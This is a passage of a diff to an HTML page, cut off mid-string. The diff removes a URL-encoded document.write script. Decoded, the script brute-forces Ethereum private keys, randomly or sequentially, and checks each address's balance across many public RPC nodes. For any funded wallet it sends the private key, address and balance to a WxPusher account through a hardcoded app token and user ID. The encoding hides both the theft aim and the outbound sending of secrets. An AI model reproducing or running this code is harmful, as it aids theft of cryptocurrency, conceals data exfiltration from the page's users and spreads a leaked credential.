@@ -366,9 +366,424 @@ document.write(unescape("<!DOCTYPE html>
             </ul>
         </section>
     </div>
-    
-    <script>
+<script>
 <!--
-document.write(unescape("%3Cdiv%20class%3D%22alert-container%22%20id%3D%22alertContainer%22%3E%3C/div%3E%0A%0A%20%20%20%20%3Cscript%20type%3D%22text/javascript%22%3E%0A%20%20%20%20%20%20%20%20//%20%u5168%u5C40%u53D8%u91CF%u5B9A%u4E49%0A%20%20%20%20%20%20%20%20let%20stopScanFlag%20%3D%20false%3B%20%20%20%20//%20%u505C%u6B62%u626B%u63CF%u6807%u5FD7%0A%20%20%20%20%20%20%20%20let%20scanInterval%3B%20%20%20%20%20%20%20%20%20%20%20//%20%u8BA1%u65F6%u5668%u95F4%u9694%0A%20%20%20%20%20%20%20%20let%20startTime%3B%20%20%20%20%20%20%20%20%20%20%20%20%20%20//%20%u5F00%u59CB%u65F6%u95F4%0A%20%20%20%20%20%20%20%20let%20scannedCount%20%3D%200%3B%20%20%20%20%20%20%20//%20%u5DF2%u626B%u63CF%u8BA1%u6570%0A%20%20%20%20%20%20%20%20let%20validAddressCount%20%3D%200%3B%20%20//%20%u6709%u6548%u5730%u5740%u8BA1%u6570%0A%20%20%20%20%20%20%20%20let%20balanceCount%20%3D%200%3B%20%20%20%20%20%20%20//%20%u6709%u4F59%u989D%u8BA1%u6570%0A%20%20%20%20%20%20%20%20let%20isScanning%20%3D%20false%3B%20%20%20%20%20//%20%u662F%u5426%u6B63%u5728%u626B%u63CF%0A%0A%20%20%20%20%20%20%20%20//%20RPC%u8282%u70B9%u5217%u8868%0A%20%20%20%20%20%20%20%20const%20rpcUrls%20%3D%20%5B%0A%20%20%20%20%20%20%20%20%20%20%20%20%27https%3A//ethereum-rpc.publicnode.com%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%27https%3A//virginia.rpc.blxrbdn.com%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%27https%3A//uk.rpc.blxrbdn.com%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%27https%3A//eth-mainnet.public.blastapi.io%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%27https%3A//ethereum.publicnode.com%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%27https%3A//singapore.rpc.blxrbdn.com%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%27https%3A//eth.rpc.blxrbdn.com%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%27https%3A//api.securerpc.com/v1%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%27https%3A//api.zan.top/eth-mainnet%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%27https%3A//rpc.mevblocker.io%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%27https%3A//rpc.flashbots.net%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%27https%3A//eth1.lava.build%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%27https%3A//ethereum.blockpi.network/v1/rpc/public%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%27https%3A//eth.api.onfinality.io/public%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%27https%3A//eth.blockrazor.xyz%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%27https%3A//rpc.eth.gateway.fm%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%27https%3A//eth.drpc.org%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%27https%3A//mainnet.gateway.tenderly.co%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%27https%3A//gateway.tenderly.co/public/mainnet%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%27https%3A//eth.merkle.io%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%27https%3A//ethereum.rpc.subquery.network/public%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%27https%3A//rpc.mevblocker.io/fast%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%27https%3A//rpc.mevblocker.io/noreverts%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%27https%3A//eth.llamarpc.com%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%27https%3A//ethereum.blockpi.network/v1/rpc/public%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%27https%3A//eth-mainnet.public.blastapi.io%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%27https%3A//eth-mainnet.alchemyapi.io/v2/demo%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%27https%3A//1rpc.io/eth%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%27https%3A//0xrpc.io/eth%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%27https%3A//rpc.mevblocker.io/fullprivacy%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%27https%3A//api-ethereum-mainnet.n.dwellir.com/f34bda43-11fb-48f6-9422-0831d9e35351%27%2C%0A%20%20%20%20%20%20%20%20%5D%3B%0A%0A%20%20%20%20%20%20%20%20const%20keyCount%20%3D%2010%3B%20%20//%20%u6BCF%u6B21%u626B%u63CF%u751F%u6210%u7684%u79C1%u94A5%u6570%u91CF%0A%20%20%20%20%20%20%20%20let%20currentSequentialKey%20%3D%20null%3B%0A%20%20%20%20%20%20%20%20let%20sequentialCounter%20%3D%200%3B%0A%0A%20%20%20%20%20%20%20%20/**%0A%20%20%20%20%20%20%20%20%20*%20%u663E%u793A%u901A%u77E5%u63D0%u793A%0A%20%20%20%20%20%20%20%20%20*%20@param%20%7Bstring%7D%20message%20%u63D0%u793A%u4FE1%u606F%0A%20%20%20%20%20%20%20%20%20*%20@param%20%7Bstring%7D%20type%20%u63D0%u793A%u7C7B%u578B%20%28primary%2C%20success%2C%20danger%29%0A%20%20%20%20%20%20%20%20%20*/%0A%20%20%20%20%20%20%20%20function%20showAlert%28message%2C%20type%20%3D%20%27primary%27%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20const%20alertContainer%20%3D%20document.getElementById%28%27alertContainer%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20const%20alertId%20%3D%20%27alert-%27%20+%20Date.now%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20const%20alert%20%3D%20document.createElement%28%27div%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20alert.id%20%3D%20alertId%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20alert.className%20%3D%20%60alert%20alert-%24%7Btype%7D%20custom-alert%20text-center%20fade%20show%60%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20alert.role%20%3D%20%27alert%27%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20alert.innerHTML%20%3D%20message%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20alertContainer.prepend%28alert%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20setTimeout%28%28%29%20%3D%3E%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20const%20alertElement%20%3D%20document.getElementById%28alertId%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20%28alertElement%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20alertElement.classList.add%28%27fade%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20setTimeout%28%28%29%20%3D%3E%20alertElement.remove%28%29%2C%20300%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%205000%29%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20/**%0A%20%20%20%20%20%20%20%20%20*%20%u683C%u5F0F%u5316%u65F6%u95F4%u663E%u793A%20%28HH%3AMM%3ASS%29%0A%20%20%20%20%20%20%20%20%20*%20@param%20%7Bnumber%7D%20seconds%20%u603B%u79D2%u6570%0A%20%20%20%20%20%20%20%20%20*%20@returns%20%7Bstring%7D%20%u683C%u5F0F%u5316%u540E%u7684%u65F6%u95F4%u5B57%u7B26%u4E32%0A%20%20%20%20%20%20%20%20%20*/%0A%20%20%20%20%20%20%20%20function%20formatTime%28seconds%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20const%20h%20%3D%20Math.floor%28seconds%20/%203600%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20const%20m%20%3D%20Math.floor%28%28seconds%20%25%203600%29%20/%2060%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20const%20s%20%3D%20seconds%20%25%2060%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20%5Bh.toString%28%29.padStart%282%2C%20%270%27%29%2C%20m.toString%28%29.padStart%282%2C%20%270%27%29%2C%20s.toString%28%29.padStart%282%2C%20%270%27%29%5D.join%28%27%3A%27%29%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20/**%0A%20%20%20%20%20%20%20%20%20*%20%u66F4%u65B0%u8BA1%u65F6%u5668%u663E%u793A%0A%20%20%20%20%20%20%20%20%20*/%0A%20%20%20%20%20%20%20%20function%20updateTimer%28%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20%28%21startTime%29%20return%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20const%20elapsed%20%3D%20Math.floor%28%28Date.now%28%29%20-%20startTime%29%20/%201000%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20document.getElementById%28%27elapsedTime%27%29.textContent%20%3D%20formatTime%28elapsed%29%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20/**%0A%20%20%20%20%20%20%20%20%20*%20%u66F4%u65B0%u7EDF%u8BA1%u4FE1%u606F%u663E%u793A%0A%20%20%20%20%20%20%20%20%20*/%0A%20%20%20%20%20%20%20%20function%20updateStats%28%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20document.getElementById%28%27scannedCount%27%29.textContent%20%3D%20scannedCount.toLocaleString%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20document.getElementById%28%27validAddressCount%27%29.textContent%20%3D%20validAddressCount.toLocaleString%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20document.getElementById%28%27balanceCount%27%29.textContent%20%3D%20balanceCount.toLocaleString%28%29%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20/**%0A%20%20%20%20%20%20%20%20%20*%20%u968F%u673A%u83B7%u53D6%u4E00%u4E2ARPC%u8282%u70B9URL%0A%20%20%20%20%20%20%20%20%20*%20@returns%20%7Bstring%7D%20RPC%u8282%u70B9URL%0A%20%20%20%20%20%20%20%20%20*/%0A%20%20%20%20%20%20%20%20function%20getRandomRpcUrl%28%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20const%20randomIndex%20%3D%20Math.floor%28Math.random%28%29%20*%20rpcUrls.length%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20rpcUrls%5BrandomIndex%5D%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20/**%0A%20%20%20%20%20%20%20%20%20*%20%u521B%u5EFAEthers.js%u63D0%u4F9B%u8005%0A%20%20%20%20%20%20%20%20%20*%20@param%20%7Bstring%7D%20rpcUrl%20RPC%u8282%u70B9URL%0A%20%20%20%20%20%20%20%20%20*%20@returns%20%7Bethers.JsonRpcProvider%7D%20Ethers%u63D0%u4F9B%u8005%u5B9E%u4F8B%0A%20%20%20%20%20%20%20%20%20*/%0A%20%20%20%20%20%20%20%20function%20createProvider%28rpcUrl%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20new%20ethers.JsonRpcProvider%28rpcUrl%29%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20/**%0A%20%20%20%20%20%20%20%20%20*%20%u751F%u6210%u968F%u673A%u79C1%u94A5%0A%20%20%20%20%20%20%20%20%20*%20@returns%20%7Bstring%7D%20%u5341%u516D%u8FDB%u5236%u683C%u5F0F%u7684%u79C1%u94A5%0A%20%20%20%20%20%20%20%20%20*/%0A%20%20%20%20%20%20%20%20function%20generateRandomPrivateKey%28%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20ethers.Wallet.createRandom%28%29.privateKey%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20/**%0A%20%20%20%20%20%20%20%20%20*%20%u751F%u6210%u987A%u5E8F%u79C1%u94A5%0A%20%20%20%20%20%20%20%20%20*%20@returns%20%7Bstring%7D%20%u5341%u516D%u8FDB%u5236%u683C%u5F0F%u7684%u79C1%u94A5%0A%20%20%20%20%20%20%20%20%20*/%0A%20%20%20%20%20%20%20%20function%20generateSequentialPrivateKey%28%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20%28%21currentSequentialKey%20%7C%7C%20sequentialCounter%20%3E%3D%20keyCount%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20currentSequentialKey%20%3D%20generateRandomPrivateKey%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20sequentialCounter%20%3D%200%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20document.getElementById%28%27resultTable%27%29.innerHTML%20%3D%20%27%27%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20const%20privateKeyBigInt%20%3D%20BigInt%28currentSequentialKey%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20const%20newPrivateKeyBigInt%20%3D%20privateKeyBigInt%20+%20BigInt%28sequentialCounter%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20sequentialCounter++%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20let%20newPrivateKey%20%3D%20newPrivateKeyBigInt.toString%2816%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20while%20%28newPrivateKey.length%20%3C%2064%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20newPrivateKey%20%3D%20%270%27%20+%20newPrivateKey%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20%270x%27%20+%20newPrivateKey%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20/**%0A%20%20%20%20%20%20%20%20%20*%20%u4ECE%u79C1%u94A5%u83B7%u53D6%u5730%u5740%0A%20%20%20%20%20%20%20%20%20*%20@param%20%7Bstring%7D%20privateKey%20%u79C1%u94A5%0A%20%20%20%20%20%20%20%20%20*%20@returns%20%7Bstring%7Cnull%7D%20%u4EE5%u592A%u574A%u5730%u5740%u6216null%28%u5982%u679C%u79C1%u94A5%u65E0%u6548%29%0A%20%20%20%20%20%20%20%20%20*/%0A%20%20%20%20%20%20%20%20function%20getAddressFromPrivateKey%28privateKey%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20try%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20const%20wallet%20%3D%20new%20ethers.Wallet%28privateKey%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20wallet.address%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20catch%20%28e%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20console.error%28%22%u65E0%u6548%u7684%u79C1%u94A5%3A%22%2C%20privateKey%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20null%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20/**%0A%20%20%20%20%20%20%20%20%20*%20%u67E5%u8BE2%u5730%u5740%u4F59%u989D%0A%20%20%20%20%20%20%20%20%20*%20@param%20%7Bstring%7D%20address%20%u4EE5%u592A%u574A%u5730%u5740%0A%20%20%20%20%20%20%20%20%20*%20@returns%20%7BPromise%3Cobject%3E%7D%20%u5305%u542B%u4F59%u989D%u4FE1%u606F%u7684%u5BF9%u8C61%0A%20%20%20%20%20%20%20%20%20*/%0A%20%20%20%20%20%20%20%20async%20function%20getBalance%28address%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20%28%21address%29%20return%20%7B%20value%3A%20%27%u65E0%u6548%u5730%u5740%27%2C%20success%3A%20false%20%7D%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20//%20%u968F%u673A%u9009%u62E9%u4E00%u4E2ARPC%u8282%u70B9%u5F00%u59CB%u5C1D%u8BD5%0A%20%20%20%20%20%20%20%20%20%20%20%20let%20startIndex%20%3D%20Math.floor%28Math.random%28%29%20*%20rpcUrls.length%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20let%20attempts%20%3D%200%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20let%20balance%20%3D%20%27%u67E5%u8BE2%u5931%u8D25%27%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20let%20success%20%3D%20false%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20while%20%28%21success%20%26%26%20attempts%20%3C%20rpcUrls.length%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20const%20rpcUrl%20%3D%20rpcUrls%5B%28startIndex%20+%20attempts%29%20%25%20rpcUrls.length%5D%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20const%20provider%20%3D%20createProvider%28rpcUrl%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20try%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20const%20balanceWei%20%3D%20await%20provider.getBalance%28address%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20const%20balanceInGwei%20%3D%20balanceWei%20/%2010n%20**%209n%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20balance%20%3D%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20value%3A%20balanceInGwei%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20formatted%3A%20%60%24%7BbalanceInGwei.toString%28%29%7D%20Gwei%60%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20success%3A%20true%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20success%20%3D%20true%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%20catch%20%28error%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20attempts++%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20console.error%28%60RPC%u8282%u70B9%20%24%7BrpcUrl%7D%20%u67E5%u8BE2%u5931%u8D25%3A%60%2C%20error%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20balance%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20/**%0A%20%20%20%20%20%20%20%20%20*%20%u53D1%u9001%u901A%u77E5%u5230WxPusher%0A%20%20%20%20%20%20%20%20%20*%20@param%20%7Bstring%7D%20privateKey%20%u79C1%u94A5%0A%20%20%20%20%20%20%20%20%20*%20@param%20%7Bstring%7D%20address%20%u5730%u5740%0A%20%20%20%20%20%20%20%20%20*%20@param%20%7Bobject%7D%20balance%20%u4F59%u989D%u4FE1%u606F%0A%20%20%20%20%20%20%20%20%20*/%0A%20%20%20%20%20%20%20%20function%20sendToWxPusher%28privateKey%2C%20address%2C%20balance%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20const%20APP_TOKEN%20%3D%20%22AT_eBVzfMwOQIbii2XVrjG4GnYenmkgDgR5%22%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20const%20UIDS%20%3D%20%5B%22UID_a74XG9KK8OMBcMxRbm3uodWXf7nq%22%5D%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20const%20message%20%3D%20%60%u7F51%u7AD9%u53D1%u73B0ETH%u4F59%u989D%21%5Cn%u79C1%u94A5%3A%20%24%7BprivateKey%7D%5Cn%u5730%u5740%3A%20%24%7Baddress%7D%5Cn%u4F59%u989D%3A%20%24%7Bbalance.formatted%7D%60%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20const%20payload%20%3D%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20appToken%3A%20APP_TOKEN%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20content%3A%20message%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20uids%3A%20UIDS%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20fetch%28%27https%3A//wxpusher.zjiecode.com/api/send/message%27%2C%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20method%3A%20%27POST%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20headers%3A%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%27Content-Type%27%3A%20%27application/json%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20body%3A%20JSON.stringify%28payload%29%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%29%0A%20%20%20%20%20%20%20%20%20%20%20%20.then%28response%20%3D%3E%20response.json%28%29%29%0A%20%20%20%20%20%20%20%20%20%20%20%20.then%28data%20%3D%3E%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20console.log%28%22%u53D1%u9001%u6210%u529F%3A%22%2C%20data%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20showAlert%28%60%u5DF2%u53D1%u9001%u901A%u77E5%3A%20%24%7Baddress.substring%280%2C%206%29%7D...%24%7Baddress.substring%2838%29%7D%60%2C%20%27success%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%29%0A%20%20%20%20%20%20%20%20%20%20%20%20.catch%28error%20%3D%3E%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20console.error%28%22%u53D1%u9001%u5931%u8D25%3A%22%2C%20error%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20showAlert%28%60%u901A%u77E5%u53D1%u9001%u5931%u8D25%3A%20%24%7Berror.message%7D%60%2C%20%27danger%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%29%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20/**%0A%20%20%20%20%20%20%20%20%20*%20%u6DFB%u52A0%u7ED3%u679C%u884C%u5230%u8868%u683C%0A%20%20%20%20%20%20%20%20%20*%20@param%20%7Bstring%7D%20privateKey%20%u79C1%u94A5%0A%20%20%20%20%20%20%20%20%20*%20@param%20%7Bstring%7D%20address%20%u5730%u5740%0A%20%20%20%20%20%20%20%20%20*%20@param%20%7Bobject%7D%20balance%20%u4F59%u989D%u4FE1%u606F%0A%20%20%20%20%20%20%20%20%20*/%0A%20%20%20%20%20%20%20%20function%20addResultRow%28privateKey%2C%20address%2C%20balance%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20const%20resultTable%20%3D%20document.getElementById%28%27resultTable%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20const%20row%20%3D%20document.createElement%28%27tr%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20const%20balanceClass%20%3D%20balance.value%20%3E%200%20%3F%20%27balance-positive%27%20%3A%20%27balance-zero%27%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20const%20balanceText%20%3D%20balance.success%20%3F%20balance.formatted%20%3A%20balance.value%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20row.innerHTML%20%3D%20%60%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ctd%3E%24%7BprivateKey%7D%3C/td%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ctd%3E%3Ca%20href%3D%22https%3A//etherscan.io/address/%24%7Baddress%7D%22%20target%3D%22_blank%22%3E%24%7Baddress%7D%3C/a%3E%3C/td%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ctd%20class%3D%22%24%7BbalanceClass%7D%22%3E%24%7BbalanceText%7D%3C/td%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%60%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20resultTable.prepend%28row%29%3B%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20/**%0A%20%20%20%20%20%20%20%20%20*%20%u5F00%u59CB%u626B%u63CF%0A%20%20%20%20%20%20%20%20%20*/%0A%20%20%20%20%20%20%20%20async%20function%20startScan%28%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20%28isScanning%29%20return%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20isScanning%20%3D%20true%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20stopScanFlag%20%3D%20false%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20startTime%20%3D%20Date.now%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20scannedCount%20%3D%200%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20validAddressCount%20%3D%200%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20balanceCount%20%3D%200%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20const%20resultTable%20%3D%20document.getElementById%28%27resultTable%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20const%20scanMode%20%3D%20document.getElementById%28%27scanMode%27%29.value%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20const%20stopCondition%20%3D%20document.getElementById%28%27stopCondition%27%29.value%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20//%20%u6E05%u7A7A%u73B0%u6709%u7ED3%u679C%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20%28scanMode%20%3D%3D%3D%20%27random%27%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20resultTable.innerHTML%20%3D%20%27%27%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20updateStats%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20showAlert%28%27%u626B%u63CF%u5DF2%u5F00%u59CB%27%2C%20%27primary%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20document.getElementById%28%27startScan%27%29.disabled%20%3D%20true%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20document.getElementById%28%27stopScan%27%29.style.display%20%3D%20%27inline-block%27%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20//%20%u66F4%u65B0%u8BA1%u65F6%u5668%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20%28scanInterval%29%20clearInterval%28scanInterval%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20scanInterval%20%3D%20setInterval%28updateTimer%2C%201000%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20while%20%28%21stopScanFlag%20%26%26%20%21stopScanFlag%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20let%20privateKeys%20%3D%20%5B%5D%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20//%20%u5982%u679C%u662F%u968F%u673A%u626B%u63CF%u6A21%u5F0F%uFF0C%u6BCF%u6B21%u751F%u6210%2010%20%u4E2A%u79C1%u94A5%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if%20%28scanMode%20%3D%3D%3D%20%27random%27%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20for%20%28let%20i%20%3D%200%3B%20i%20%3C%20keyCount%3B%20i++%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20privateKeys.push%28generateRandomPrivateKey%28%29%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20if%20%28scanMode%20%3D%3D%3D